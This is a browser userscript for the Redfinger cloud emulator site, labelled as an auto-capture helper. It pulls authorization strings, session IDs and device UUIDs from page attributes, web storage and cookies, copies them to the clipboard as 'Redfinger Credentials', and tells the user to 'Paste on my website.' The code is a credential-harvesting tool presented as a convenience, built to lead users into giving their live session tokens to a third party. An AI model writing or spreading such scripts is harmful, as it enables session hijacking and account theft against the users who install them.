// ==UserScript==
// @name         Redfinger Auto Capture
// @namespace    https://dazai-ux.github.io
// @version      2.0
// @description  Better detection
// @author       Redfinger Auto
// @match        https://www.cloudemulator.net/*
// @grant        GM_setClipboard
// @run-at       document-end
// ==/UserScript==

(function () {
    'use strict';

    function createButton() {
        if (document.getElementById('rf-capture-btn')) return;

        const btn = document.createElement('button');
        btn.id = 'rf-capture-btn';
        btn.innerHTML = '📋 COPY INFORMATION';
        btn.style.cssText = `
            position: fixed !important; bottom: 20px !important; right: 20px !important; 
            z-index: 2147483647 !important; padding: 18px 30px !important;
            background: linear-gradient(90deg, #3b82f6, #1e90ff) !important; color: white !important;
            border: none !important; border-radius: 50px !important; font-size: 17px !important;
            font-weight: bold !important; box-shadow: 0 10px 30px rgba(59,130,246,0.8) !important;
            cursor: pointer !important;
        `;

        btn.onclick = captureInfo;
        document.body.appendChild(btn);
    }

    function captureInfo() {
        let userId = "Not Found";
        let sessionId = "Not Found";
        let uuid = "Not Found";

        // Method 1: Authorization attribute
        document.querySelectorAll('*').forEach(el => {
            let auth = el.getAttribute('authorization') || el.getAttribute('Authorization');
            if (auth && auth.length > 15) {
                const parts = auth.trim().split(/\s+/);
                if (parts.length >= 2) {
                    userId = parts[0];
                    sessionId = parts[1];
                }
            }
        });

        // Method 2: Check localStorage & sessionStorage
        const storage = {...localStorage, ...sessionStorage};
        for (let key in storage) {
            const value = storage[key];
            if (typeof value === 'string' && value.length > 30) {
                if (key.toLowerCase().includes('auth') || value.includes(' ')) {
                    const parts = value.trim().split(/\s+/);
                    if (parts.length >= 2) {
                        userId = parts[0];
                        sessionId = parts[1];
                    }
                }
                if (key.toLowerCase().includes('uuid') || key.toLowerCase().includes('device')) {
                    uuid = value;
                }
            }
        }

        // Method 3: Cookies
        document.cookie.split(';').forEach(cookie => {
            if (cookie.includes('auth') || cookie.includes('session')) {
                console.log("Cookie found:", cookie);
            }
        });

        const text = `🔑 Redfinger Credentials\n\n` +
                    `User ID     : ${userId}\n` +
                    `Session ID  : ${sessionId}\n` +
                    `UUID        : ${uuid}`;

        GM_setClipboard(text);

        alert(`📋 Captured Information:\n\n` +
              `User ID     : ${userId}\n` +
              `Session ID  : ${sessionId}\n` +
              `UUID        : ${uuid}\n\n` +
              `✅ Copied to clipboard!\n\nPaste on my website.`);
    }

    setTimeout(createButton, 2500);
})();
